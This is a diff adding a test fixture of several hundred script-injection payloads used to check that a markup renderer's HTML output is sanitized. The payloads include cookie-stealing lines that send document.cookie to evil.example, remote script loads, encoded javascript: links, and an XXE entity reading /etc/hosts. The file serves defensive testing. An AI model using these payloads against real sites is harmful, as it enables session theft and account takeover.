@@ -1,0 +1,861 @@
+%% Script-injection payloads for the markup package.
+%%
+%% One payload per line. The test TestPayloadsRenderSafe parses each payload with
+%% every mix of the three flags (Markdown, smilies, autolink), renders the tree,
+%% and runs the strict HTML check on the result.
+%%
+%% A line that starts with "%% category:" opens a category. Every other line that
+%% starts with "%%" is a comment, and a blank line is ignored. All other lines are
+%% payloads, including a line that starts with "#" (a Markdown heading). A payload is read as written, with two escapes so that the file stays
+%% plain ASCII and a line can hold a control character:
+%%   {U+XXXX}   the code point U+XXXX, with 4 to 6 hex digits
+%%   {X:hh}     one raw byte, with two hex digits (it may make invalid UTF-8)
+%% A backslash is a backslash. The addresses use the reserved .example names.
+%%
+%% The payloads are written from public knowledge of script-injection techniques:
+%% the ways that markup, attributes, URL schemes and the parser itself have been
+%% used to run script in a page. Each line is a test of one idea.
+
+%% category: script tags
+<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script src=https://evil.example/x.js></script>
+<script src="//evil.example/x.js"></script>
+<script/src=//evil.example/x.js></script>
+<script >alert(1)</script >
+<script{U+0009}>alert(1)</script>
+<script{U+000A}>alert(1)</script>
+<script{U+000C}>alert(1)</script>
+<script{U+000B}>alert(1)</script>
+<script{U+0000}>alert(1)</script>
+<scr{U+0000}ipt>alert(1)</scr{U+0000}ipt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+< script>alert(1)</ script>
+<script
+<script>
+</script><script>alert(1)</script>
+<script type=module>import("//evil.example/x.js")</script>
+<script type="text/javascript">alert(String.fromCharCode(88,83,83))</script>
+<script>document.location='//evil.example/?'+document.cookie</script>
+<script>fetch('//evil.example',{method:'POST',body:document.cookie})</script>
+<script>/*</script><script>*/alert(1)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&lt;script&gt;alert(1)&lt;/script&gt;<script>alert(2)</script>
+\<script>alert(1)\</script>
+**<script>alert(1)</script>**
+*<script>alert(1)*</script>
+# <script>alert(1)</script>
+- <script>alert(1)</script>
+1. <script>alert(1)</script>
+<p><script>alert(1)</script></p>
+<div>{U+000A}<script>alert(1)</script>{U+000A}</div>
+<script>alert(1)
+x<script>alert(1)</script
+:)<script>alert(1)</script>:)
+
+%% category: event handlers
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<IMG SRC=x ONERROR=alert(1)>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src onerror=alert(1)>
+<img src=x on{U+0000}error=alert(1)>
+<img src=x onerror
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<a href="/x" onmouseover="alert(1)">hover</a>
+<div onclick=alert(1)>click</div>
+<p onpointerenter=alert(1)>move</p>
+<marquee onstart=alert(1)>x</marquee>
+<iframe onload=alert(1)></iframe>
+<button onclick=alert(1)>x</button>
+<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart=alert(1)>x</p>
+<p style="width:expression(alert(1))">x</p>
+<p style="background:url(javascript:alert(1))">x</p>
+[a](/x "t" onclick="alert(1)")
+[a](/x onclick=alert(1))
+![a](/x.png onerror=alert(1))
+![a](/x.png "t" onerror="alert(1)")
+[a](/x){onclick=alert(1)}
+[a](/x){: onclick="alert(1)"}
+on error=alert(1)
+onerror=alert(1)//
+
+%% category: javascript, vbscript and data links
+[a](javascript:alert(1))
+[a](JavaScript:alert(1))
+[a](JAVASCRIPT:alert(1))
+[a](jAvAsCrIpT:alert(1))
+[a]( javascript:alert(1))
+[a](javascript :alert(1))
+[a](javascript: alert(1))
+[a](javascript:alert(1) "title")
+[a](<javascript:alert(1)>)
+[a](vbscript:msgbox(1))
+[a](VBScript:msgbox(1))
+[a](livescript:alert(1))
+[a](mocha:alert(1))
+[a](data:text/html,<script>alert(1)</script>)
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+[a](DATA:text/html,x)
+[a](data:application/javascript,alert(1))
+[a](data:image/svg+xml,<svg onload=alert(1)>)
+[a](view-source:https://example.com/)
+[a](file:///etc/hosts)
+[a](ftp://example.com/x)
+[a](about:blank)
+[a](blob:https://example.com/00000000-0000-0000-0000-000000000000)
+[a](ws://evil.example/)
+[a](tel:+15555550100)
+[a](sms:+15555550100)
+[a](intent://x#Intent;scheme=javascript;end)
+[a](jar:https://evil.example/x.jar!/)
+[a](//evil.example/x)
+[a](///evil.example/x)
+[a](/\evil.example)
+[a](\\evil.example\x)
+[a](\/evil.example)
+[a](http:javascript:alert(1))
+[a](https:\\evil.example)
+[a](javascript://example.com/%0aalert(1))
+[a](javascript:/*%0a*/alert(1))
+[a](javascript:void(0))
+[a](#)
+[a](?x=1)
+[a](x)
+[a]()
+![a](javascript:alert(1))
+![a](vbscript:msgbox(1))
+![a](data:text/html,<script>alert(1)</script>)
+![a](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)
+![a](data:image/gif;base64,R0lGODlhAQABAAAAACw=)
+![a](//evil.example/x.png)
+![a](x.png)
+![a]()
+javascript:alert(1)
+<javascript:alert(1)>
+www.example.com/javascript:alert(1)
+[javascript:alert(1)](/x)
+[<script>alert(1)</script>](/x)
+
+%% category: encoded and spaced schemes
+[a](&#106;avascript:alert(1))
+[a](&#x6A;avascript:alert(1))
+[a](&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1))
+[a](&#0000106avascript:alert(1))
+[a](&#106avascript:alert(1))
+[a](java&#9;script:alert(1))
+[a](java&#x09;script:alert(1))
+[a](java&#10;script:alert(1))
+[a](java&#x0A;script:alert(1))
+[a](java&#13;script:alert(1))
+[a](java&Tab;script:alert(1))
+[a](java&NewLine;script:alert(1))
+[a](javascript&colon;alert(1))
+[a](javascript&#58;alert(1))
+[a](javascript&#x3A;alert(1))
+[a](javascript&#x3a;alert&lpar;1&rpar;)
+[a](&Tab;javascript:alert(1))
+[a](&#32;javascript:alert(1))
+[a](&#x20;&#x20;javascript:alert(1))
+[a](%6Aavascript:alert(1))
+[a](%6a%61%76%61%73%63%72%69%70%74:alert(1))
+[a](javascript%3Aalert(1))
+[a](javascript%3aalert(1))
+[a](%0Ajavascript:alert(1))
+[a](java%0Ascript:alert(1))
+[a](java%09script:alert(1))
+[a](java%00script:alert(1))
+[a](%20javascript:alert(1))
+[a](%E2%80%AEjavascript:alert(1))
+[a](java{U+0009}script:alert(1))
+[a](java{U+000A}script:alert(1))
+[a](java{U+000D}script:alert(1))
+[a](java{U+0000}script:alert(1))
+[a]({U+0001}javascript:alert(1))
+[a]({U+001F}javascript:alert(1))
+[a]({U+007F}javascript:alert(1))
+[a]({U+0085}javascript:alert(1))
+[a]({U+00A0}javascript:alert(1))
+[a]({U+1680}javascript:alert(1))
+[a]({U+2000}javascript:alert(1))
+[a]({U+2028}javascript:alert(1))
+[a]({U+3000}javascript:alert(1))
+[a](java{U+2028}script:alert(1))
+![a](&#106;avascript:alert(1))
+![a](java&Tab;script:alert(1))
+![a](data&colon;text/html,x)
+![a](%64ata:text/html,x)
+[a](&#x64;ata:text/html,x)
+[a](vb&#115;cript:msgbox(1))
+[a](data:text/html;base64,&#80;&#72;&#78;)
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="java&Tab;script:alert(1)">x</a>
+<a href=javascript:alert(1)>x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="JaVa{U+0009}ScRiPt:alert(1)">x</a>
+
+%% category: svg and mathml
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><script href=data:,alert(1) /></svg>
+<svg><a xlink:href="javascript:alert(1)"><text x=0 y=20>x</text></a></svg>
+<svg><a href="javascript:alert(1)"><circle r=9 /></a></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' onload='alert(1)'/>#x" /></svg>
+<svg><animate attributeName=href values=javascript:alert(1) /><a><text>x</text></a></svg>
+<svg><set attributeName=onmouseover to=alert(1) /></svg>
+<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
+<svg><style>*{background:url(javascript:alert(1))}</style></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+<svg><title><![CDATA[</title><img src onerror=alert(1)>]]></title></svg>
+<svg><p><style><g title="</style><img src onerror=alert(1)>"></p></svg>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<math href="javascript:alert(1)">x</math>
+<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">x</maction></math>
+<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;"></table></mtext></math>
+<math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>"></mtext></svg></mglyph></form></mtext></math>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>
+<template><script>alert(1)</script></template>
+<xmp><script>alert(1)</script></xmp>
+<plaintext><script>alert(1)</script>
+<title></title><script>alert(1)</script>
+<textarea></textarea><script>alert(1)</script>
+![a](/x.svg)
+![a](https://example.com/x.svg#onload=alert(1))
+![a](data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>)
+[a](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)
+<img src="x.svg">
+<object data="data:image/svg+xml,x"></object>
+<embed src="x.svg">
+
+%% category: attribute breaks
+[a](/x" onmouseover="alert(1))
+[a](/x"onmouseover="alert(1))
+[a](/x' onmouseover='alert(1))
+[a](/x'onmouseover='alert(1))
+[a](/x` onmouseover=alert(1))
+[a](/x`onmouseover=alert(1))
+[a](/x"><script>alert(1)</script>)
+[a](/x'><script>alert(1)</script>)
+[a](/x"><img src=x onerror=alert(1)>)
+[a](/x" autofocus onfocus="alert(1))
+[a](/x"/onmouseover="alert(1))
+[a](/x" style="x:expression(alert(1)))
+[a](/x"{U+000A}onmouseover="alert(1))
+[a](/x"{U+0009}onmouseover="alert(1))
+[a](https://example.com/?q=" onmouseover="alert(1))
+[a](https://example.com/?q='+onmouseover='alert(1))
+[a](https://example.com/#" onmouseover="alert(1))
+[a](https://example.com/"><svg onload=alert(1)>)
+![a](/x.png" onerror="alert(1))
+![a](/x.png'onerror='alert(1))
+![a](/x.png` onerror=alert(1))
+![a](/x.png"><script>alert(1)</script>)
+![a" onerror="alert(1)](/x.png)
+![a' onerror='alert(1)](/x.png)
+![a` onerror=alert(1)](/x.png)
+![a"><script>alert(1)</script>](/x.png)
+![a" src=x onerror="alert(1)](/x.png)
+![a&quot; onerror=&quot;alert(1)](/x.png)
+![a&#34; onerror=&#34;alert(1)](/x.png)
+![a&#x22; onerror=&#x22;alert(1)](/x.png)
+![a{U+000A}onerror=alert(1)](/x.png)
+[a" onmouseover="alert(1)](/x)
+[a' onmouseover='alert(1)](/x)
+[a` onmouseover=alert(1)](/x)
+[a"><script>alert(1)</script>](/x)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+`><script>alert(1)</script>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+` onmouseover=alert(1)
+"></a><script>alert(1)</script>
+'></a><script>alert(1)</script>
+"/><img src=x onerror=alert(1)>
+</p><script>alert(1)</script><p>
+</blockquote><script>alert(1)</script><blockquote>
+</code></pre><script>alert(1)</script><pre><code>
+</span><script>alert(1)</script><span>
+
+%% category: link titles
+[a](/x "title")
+[a](/x 'title')
+[a](/x (title))
+[a](/x "<script>alert(1)</script>")
+[a](/x '<script>alert(1)</script>')
+[a](/x "&quot; onclick=&quot;alert(1)")
+[a](/x "\" onclick=\"alert(1)")
+[a](/x '\' onclick=\'alert(1)')
+[a](/x "t" "u")
+[a](/x "t"onclick="y")
+[a](/x "unterminated)
+[a](/x "t{U+000A}onclick=alert(1)")
+[a](/x "`onclick=alert(1)")
+[a](/x "javascript:alert(1)")
+[a](/x "t" 'u' (v))
+[a](/x (t "u"))
+[a](/x ("><script>alert(1)</script>))
+[a](/x ((((((((((((((((((((((((((((((((t))))))))))))))))))))))))))))))))
+![a](/x.png "title")
+![a](/x.png "<script>alert(1)</script>")
+![a](/x.png "\" onerror=\"alert(1)")
+![a](/x.png 'x' onerror='y')
+![a](/x.png (t))
+![a](</x.png "t">)
+[a](<> "t")
+[a](</x onclick=alert(1)>)
+[a](</x"onclick="alert(1)>)
+[a](</x>"onclick="alert(1))
+[a](</x> "t" onclick="alert(1)")
+
+%% category: reference links
+[a][r]{U+000A}{U+000A}[r]: javascript:alert(1)
+[a][r]{U+000A}{U+000A}[r]: JaVaScRiPt:alert(1)
+[a][r]{U+000A}{U+000A}[r]: <javascript:alert(1)>
+[a][r]{U+000A}{U+000A}[r]: data:text/html,<script>alert(1)</script>
+[a][r]{U+000A}{U+000A}[r]: vbscript:msgbox(1)
+[a][r]{U+000A}{U+000A}[r]: //evil.example/x
+[a][r]{U+000A}{U+000A}[r]: &#106;avascript:alert(1)
+[a][r]{U+000A}{U+000A}[r]: java&Tab;script:alert(1)
+[a][r]{U+000A}{U+000A}[r]: /x "\" onclick=\"alert(1)"
+[a][r]{U+000A}{U+000A}[r]: /x '"onmouseover="alert(1)'
+[a][r]{U+000A}{U+000A}[r]: /x"><script>alert(1)</script>
+[a][r]{U+000A}{U+000A}[r]:{U+000A}  javascript:alert(1)
+[a][r]{U+000A}{U+000A}[r]: /x{U+000A}"title"
+[a][R]{U+000A}{U+000A}[r]: javascript:alert(1)
+[a][]{U+000A}{U+000A}[a]: javascript:alert(1)
+[a]{U+000A}{U+000A}[a]: javascript:alert(1)
+[a]{U+000A}{U+000A}[a]: data:text/html,x
+![a][r]{U+000A}{U+000A}[r]: javascript:alert(1)
+![a][r]{U+000A}{U+000A}[r]: data:image/svg+xml,<svg onload=alert(1)>
+![a][r]{U+000A}{U+000A}[r]: /x.png "\" onerror=\"alert(1)"
+![a][]{U+000A}{U+000A}[a]: /x.png'onerror='alert(1)
+[<script>alert(1)</script>][r]{U+000A}{U+000A}[r]: /x
+[a][<script>alert(1)</script>]{U+000A}{U+000A}[<script>alert(1)</script>]: javascript:alert(1)
+[a][r][r]{U+000A}{U+000A}[r]: javascript:alert(1)
+[r]: javascript:alert(1)
+[r]: <script>alert(1)</script>
+[r]: /x "<script>alert(1)</script>"
+[a][r]{U+000A}[r]: javascript:alert(1)
+[a][r]{U+000A}{U+000A}[r]: /x{U+000A}{U+000A}[r]: javascript:alert(1)
+[a][b]{U+000A}{U+000A}[b]: [a][b]
+[a][b]{U+000A}{U+000A}[b]: [c][d]{U+000A}[d]: javascript:alert(1)
+
+%% category: autolinks
+<JAVASCRIPT:alert(1)>
+<vbscript:msgbox(1)>
+<data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<data:text/html,<script>alert(1)</script>>
+<https://example.com/"onmouseover="alert(1)>
+<https://example.com/'onclick='alert(1)>
+<https://example.com/`onclick=alert(1)>
+<https://example.com/><script>alert(1)</script>>
+<https://example.com/?a=1&b=<script>>
+<https://evil.example@example.com/>
+<https://example.com@evil.example/>
+<https://example.com\@evil.example/>
+<http://example.com:80@evil.example/>
+<a@b.c"onmouseover="alert(1)>
+<a@b.c><script>alert(1)</script>
+<"onmouseover="alert(1)"@example.com>
+<a@b.c?cc=evil@x.example>
+<a@b.c?subject=x&body=<script>alert(1)</script>>
+<a%40b.c>
+<mailto:a@b.c?cc=evil@x.example>
+<mailto:a@b.c>
+<a@b.c,evil@x.example>
+<a@b.c;evil@x.example>
+<a@b.c>{U+000A}<a@b.c>
+http://example.com/"><script>alert(1)</script>
+http://example.com/"onmouseover="alert(1)
+http://example.com/'onclick='alert(1)
+http://example.com/`onclick=alert(1)
+http://example.com/<script>alert(1)</script>
+http://example.com/?a=<script>alert(1)</script>
+http://example.com/#<script>alert(1)</script>
+http://example.com/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://example.com/&quot;onmouseover=&quot;alert(1)
+http://example.com/&#34;onmouseover=&#34;alert(1)
+http://user:pass@example.com/
+http://[::]/
+http://evil.example\@example.com/
+http://example.com\.evil.example/
+http:///evil.example
+http:evil.example
+https://
+https://.
+www.example.com/"onmouseover="alert(1)
+www.example.com/<script>alert(1)</script>
+www.example.com/?x=javascript:alert(1)
+www.example.com/&quot;onmouseover=&quot;alert(1)
+a@b.c"onmouseover="alert(1)
+a@b.c<script>alert(1)</script>
+"><img src=x onerror=alert(1)>@example.com
+"onmouseover="alert(1)"@example.com
+a@b.c?cc=evil@x.example
+a@example.com,evil@example.com
+a@example.com%0d%0aBcc:evil@example.com
+
+%% category: comments and cdata
+<!-- <script>alert(1)</script> -->
+<!--><script>alert(1)</script>-->
+<!---><script>alert(1)</script>-->
+<!--><img src=x onerror=alert(1)>
+<!-- --!><script>alert(1)</script> -->
+<!-- -- ><script>alert(1)</script> -->
+<!--[if IE]><script>alert(1)</script><![endif]-->
+<!--[if !IE]><!--><script>alert(1)</script><!--<![endif]-->
+<!-- unterminated <script>alert(1)</script>
+<!--
+--><script>alert(1)</script>
+<![CDATA[<script>alert(1)</script>]]>
+<![CDATA[]]><script>alert(1)</script>
+<![CDATA[ unterminated <script>alert(1)</script>
+<![if gte IE 4]><script>alert(1)</script><![endif]>
+<?xml version="1.0"?><script>alert(1)</script>
+<?php echo "<script>alert(1)</script>"; ?>
+<?><script>alert(1)</script>
+<!DOCTYPE html><script>alert(1)</script>
+<!DOCTYPE html [<!ENTITY x SYSTEM "file:///etc/hosts">]>&x;
+<!ENTITY x "<script>alert(1)</script>">&x;
+<!x><script>alert(1)</script>
+<!><script>alert(1)</script>
+</ ><script>alert(1)</script>
+</><script>alert(1)</script>
+a<!---->b<script>alert(1)</script>
+a<!-- b -->c <img src=x onerror=alert(1)>
+<!-- `<script>alert(1)</script>` -->
+`<!--` <script>alert(1)</script> `-->`
+-->
+--!>
+<!--{U+0000}--><script>alert(1)</script>
+<!--{U+202E}--><script>alert(1)</script>
+
+%% category: quotes and spoilers
+> <script>alert(1)</script>
+> > <script>alert(1)</script>
+> > > > > > > > > > > > <script>alert(1)</script>
+> [a](javascript:alert(1))
+> ![a](javascript:alert(1))
+> [a](/x" onclick="alert(1))
+> [a][r]{U+000A}>{U+000A}> [r]: javascript:alert(1)
+> https://www.youtube.com/watch?v="><script>alert(1)</script>
+> ```{U+000A}> <script>alert(1)</script>{U+000A}> ```
+> - <script>alert(1)</script>
+> # <script>alert(1)</script>
+>> <img src=x onerror=alert(1)>
+>[a](javascript:alert(1))
+> **[a](javascript:alert(1))**
+> ||<script>alert(1)</script>||
+> ||[a](javascript:alert(1))||
+>{U+000A}<script>alert(1)</script>
+> a{U+000A}<script>alert(1)</script>
+> a{U+000A}b{U+000A}<script>alert(1)</script>
+||<script>alert(1)</script>||
+||[a](javascript:alert(1))||
+||![a](javascript:alert(1))||
+||`<script>alert(1)</script>`||
+||**<script>alert(1)</script>**||
+||||<script>alert(1)</script>||||
+||| <script>alert(1)</script> |||
+|| ||<script>alert(1)</script>|| ||
+||a||b||<script>alert(1)</script>
+||[a](/x" onclick="y)||
+||" onmouseover="alert(1)||
+||a<script>alert(1)
+||a{U+000A}{U+000A}<script>alert(1)</script>||
+||> <script>alert(1)</script>||
+||- <script>alert(1)</script>||
+||# <script>alert(1)</script>||
+||https://www.youtube.com/watch?v="><script>||
+**||<script>alert(1)</script>**||
+*||*<script>alert(1)</script>||*
+||*<script>alert(1)</script>||*
+> ||> ||<script>alert(1)</script>|| ||
+- > ||<script>alert(1)</script>||
+1. > - ||<script>alert(1)</script>||
+> > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > > <script>alert(1)</script>
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <script>alert(1)</script>
+> - > - > - > - > - > - > - > - > - > - > - > - > - > - > - > - > - > - [a](javascript:alert(1))
+* * * <script>alert(1)</script>
+---<script>alert(1)</script>
+
+%% category: code spans and fences
+`<script>alert(1)</script>`
+``<script>alert(1)</script>``
+`` ` <script>alert(1)</script> ` ``
+`</code><script>alert(1)</script><code>`
+``</code></pre><script>alert(1)</script>``
+`" onmouseover="alert(1)`
+`<img src=x onerror=alert(1)>`
+`[a](javascript:alert(1))`
+` ` ` <script>alert(1)</script> ` ` `
+`<script>alert(1)</script>
+<script>alert(1)</script>`
+```{U+000A}<script>alert(1)</script>{U+000A}```
+```html{U+000A}<script>alert(1)</script>{U+000A}```
+```html{U+000A}<script>alert(1)</script>
+~~~{U+000A}<script>alert(1)</script>{U+000A}~~~
+~~~html{U+000A}</pre><script>alert(1)</script>{U+000A}~~~
+```"><script>alert(1)</script>{U+000A}x{U+000A}```
+```js" onclick="alert(1){U+000A}x{U+000A}```
+```js' onclick='alert(1){U+000A}x{U+000A}```
+```js` onclick=alert(1){U+000A}x{U+000A}```
+```js onclick=alert(1){U+000A}x{U+000A}```
+```language-x" onclick="alert(1){U+000A}x{U+000A}```
+```<script>{U+000A}x{U+000A}```
+```&quot; onclick=&quot;alert(1){U+000A}x{U+000A}```
+```&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;{U+000A}x{U+000A}```
+```{U+0000}script{U+000A}x{U+000A}```
+```{U+202E}js{U+000A}x{U+000A}```
+```javascript:alert(1){U+000A}x{U+000A}```
+```java{U+0009}script{U+000A}x{U+000A}```
+~~~"onmouseover=alert(1){U+000A}x{U+000A}~~~
+```{U+000A}</code></pre><script>alert(1)</script>{U+000A}```
+```{U+000A}```<script>alert(1)</script>{U+000A}```
+````{U+000A}```{U+000A}<script>alert(1)</script>{U+000A}```{U+000A}````
+```{U+000A}&lt;/code&gt;&lt;script&gt;alert(1)&lt;/script&gt;{U+000A}```
+    <script>alert(1)</script>
+{U+0009}<script>alert(1)</script>
+    </code></pre><script>alert(1)</script>
+- {U+000A}      <script>alert(1)</script>
+> ```{U+000A}> </code></pre><script>alert(1)</script>{U+000A}> ```
+
+%% category: embed links
+https://www.youtube.com/watch?v="><script>alert(1)</script>
+https://www.youtube.com/watch?v=dQw4w9WgXcQ"onload="alert(1)
+https://www.youtube.com/watch?v=dQw4w9WgXcQ&list="><script>
+https://www.youtube.com/watch?v=dQw4w9WgXcQ#t=1"onload="alert(1)
+https://www.youtube.com/embed/"><script>alert(1)</script>
+https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" onload="alert(1)
+https://www.youtube.com/watch?v=../../../x
+https://www.youtube.com/watch?v=%22%3E%3Cscript%3E
+https://www.youtube.com/watch?v=dQw4w9WgXcQ%0a<script>
+https://www.youtube.com/watch?v=dQw4w9WgXcQ{U+202E}
+https://www.youtube.com/watch?v=dQw4w9WgXcQ{U+200B}
+https://www.youtube.com/watch?v=dQw4w9WgXcQ{U+0000}
+https://www.youtube.com/watch?v={U+FF24}QW4w9WgXcQ
+https://www.youtube.com.evil.example/watch?v=dQw4w9WgXcQ
+https://evil.example/www.youtube.com/watch?v=dQw4w9WgXcQ
+https://evil.example/?u=https://www.youtube.com/watch?v=dQw4w9WgXcQ
+https://youtube.com@evil.example/watch?v=dQw4w9WgXcQ
+https://youtu.be/"onload="alert(1)
+https://youtu.be/dQw4w9WgXcQ"><script>alert(1)</script>
+https://youtu.be/../x
+https://youtu.be/dQw4w9WgXcQ/../../x
+https://www.youtube-nocookie.com.evil.example/embed/dQw4w9WgXcQ
+http://www.youtube.com/watch?v=dQw4w9WgXcQ
+javascript:alert(1)//www.youtube.com/watch?v=dQw4w9WgXcQ
+https://vimeo.com/123"><script>alert(1)</script>
+https://vimeo.com/123456"onload="alert(1)
+https://vimeo.com/../123
+https://vimeo.com/%2e%2e/123
+https://vimeo.com/123456?h="onload="alert(1)
+https://player.vimeo.com/video/123?h=x" onload="alert(1)
+https://player.vimeo.com/video/123/../x
+https://x.com/a/status/1"><script>alert(1)</script>
+https://x.com/a"><script>alert(1)</script>/status/1
+https://x.com/a/status/12345678901234567890"onload="alert(1)
+https://twitter.com/a/status/1?s="><script>
+https://twitter.com/a/status/1#"onload="alert(1)
+https://x.com/i/status/1"><a href="javascript:alert(1)">
+https://x.com/a/status/%22%3E
+https://www.instagram.com/p/"onmouseover="alert(1)/
+https://www.instagram.com/p/CxYzAbCd12"><script>alert(1)</script>/
+https://www.instagram.com/p/CxYzAbCd12/?x="onload="alert(1)
+https://www.instagram.com/reel/../x/
+https://www.instagram.com/p/%22/
+https://www.reddit.com/r/a"><script>alert(1)</script>/comments/abc123/
+https://www.reddit.com/r/golang/comments/abc"><script>alert(1)</script>/
+https://www.reddit.com/r/golang/comments/abc123/x"onmouseover="alert(1)/
+https://www.reddit.com/r/../comments/abc/
+https://www.reddit.com/r/a/comments/../../x/
+https://old.reddit.com/r/golang/comments/abc123/title/
+https://www.tiktok.com/@u/video/1"onload="alert(1)
+https://www.tiktok.com/@u"><script>alert(1)</script>/video/1
+https://www.tiktok.com/@u/video/12345678901234567890123"onload=
+https://www.tiktok.com/@u/video/../x
+https://www.threads.com/@u"><script>alert(1)</script>/post/abc
+https://www.threads.com/@u/post/abc"onmouseover="alert(1)
+https://www.threads.com/@u/post/../x
+https://www.threads.com/@/post/abc
+https://www.threads.net/@u/post/abc
+https://open.spotify.com/track/..%2F..%2Fx
+https://open.spotify.com/track/a"b
+https://open.spotify.com/track/a"><script>alert(1)</script>
+https://open.spotify.com/track/../x
+https://open.spotify.com/track/4uLU6hMCjMI75M1A2tKUQC?si="onload="alert(1)
+https://open.spotify.com/playlist/37i9dQZF1DXcBWIGoYBM5M"><script>
+https://open.spotify.com/evil/4uLU6hMCjMI75M1A2tKUQC
+https://soundcloud.com/a/b"><script>alert(1)</script>
+https://soundcloud.com/../../x
+https://soundcloud.com/a/b?x="onload="alert(1)
+https://soundcloud.com/a%2F..%2F..%2Fx
+https://soundcloud.com/a/b%0d%0a<script>
+https://w.soundcloud.com/player/?url=javascript:alert(1)
+https://www.youtube.com/watch?v=dQw4w9WgXcQ <script>alert(1)</script>
+<https://www.youtube.com/watch?v=dQw4w9WgXcQ"><script>alert(1)</script>>
+[https://www.youtube.com/watch?v=dQw4w9WgXcQ](javascript:alert(1))
+[a](https://www.youtube.com/watch?v=dQw4w9WgXcQ"onload="alert(1))
+![a](https://www.youtube.com/watch?v=dQw4w9WgXcQ)
+
+%% category: unicode tricks
+[a{U+202E}](https://example.com/{U+202E}x)
+[{U+202E}javascript:alert(1)](/x)
+[a](java{U+202E}script:alert(1))
+[a](jav{U+200B}ascript:alert(1))
+[a](jav{U+200C}ascript:alert(1))
+[a](jav{U+200D}ascript:alert(1))
+[a](jav{U+2060}ascript:alert(1))
+[a](jav{U+00AD}ascript:alert(1))
+[a](jav{U+FEFF}ascript:alert(1))
+[a](jav{U+180E}ascript:alert(1))
+[a](jav{U+061C}ascript:alert(1))
+[a](jav{U+2066}ascript:alert(1))
+[a](jav{U+2069}ascript:alert(1))
+[a](jav{U+E0061}ascript:alert(1))
+[a]({U+202E}javascript:alert(1))
+[a](https://example.com/{U+202E}{U+2066})
+[a](https://exa{U+202E}mple.com/)
+[a](https://example.com{U+FF0F}x)
+[a](https://example.com{U+3002}evil.example/)
+[a](https://{U+FF45}xample.com/)
+[a]({U+FF4A}avascript:alert(1))
+[a](javascript{U+FF1A}alert(1))
+[a](javascript\:alert(1))
+[a](javascript:alert{U+FF08}1{U+FF09})
+[a]({U+FF4A}{U+FF41}{U+FF56}{U+FF41}{U+FF53}{U+FF43}{U+FF52}{U+FF49}{U+FF50}{U+FF54}:alert(1))
+{U+FF1C}script{U+FF1E}alert(1){U+FF1C}/script{U+FF1E}
+{U+FF1C}img src=x onerror=alert(1){U+FF1E}
+{U+FE64}script{U+FE65}alert(1){U+FE64}/script{U+FE65}
+{U+2039}script{U+203A}alert(1){U+2039}/script{U+203A}
+{U+3008}script{U+3009}alert(1){U+3008}/script{U+3009}
+{U+02C2}script{U+02C3}alert(1){U+02C2}/script{U+02C3}
+<{U+0455}cript>alert(1)</{U+0455}cript>
+<s{U+0441}ript>alert(1)</s{U+0441}ript>
+<s{U+0301}cript>alert(1)</s{U+0301}cript>
+<script{U+200B}>alert(1)</script{U+200B}>
+<{U+200B}script>alert(1)</script>
+<{U+00AD}script>alert(1)</script>
+<img src=x o{U+200B}nerror=alert(1)>
+<img src=x o{U+00AD}nerror=alert(1)>
+<img src=x o{U+0000}nerror=alert(1)>
+<img{U+0000}src=x{U+0000}onerror=alert(1)>
+<img src=x onerror={U+FF41}lert(1)>
+<{U+0000}script>alert(1)</script>
+<scr{U+0000}ipt>alert(1)</script>
+<script>alert(1){U+0000}</script>
+{U+0000}
+{U+0000}{U+0000}{U+0000}<script>alert(1)</script>
+a{U+0000}b
+[a]({U+0000})
+[a](/x{U+0000}" onclick="alert(1))
+![a{U+0000}](/x.png)
+<scr{X:ff}ipt>alert(1)</scr{X:ff}ipt>
+<script{X:c0}>alert(1)</script>
+<{X:c0}script>alert(1)</script>
+<{X:c0}{X:bc}script>alert(1)</script>
+[a](java{X:ff}script:alert(1))
+[a]({X:ed}{X:a0}{X:80}javascript:alert(1))
+{X:ed}{X:a0}{X:80}<script>alert(1)</script>
+{X:f4}{X:90}{X:80}{X:80}<script>alert(1)</script>
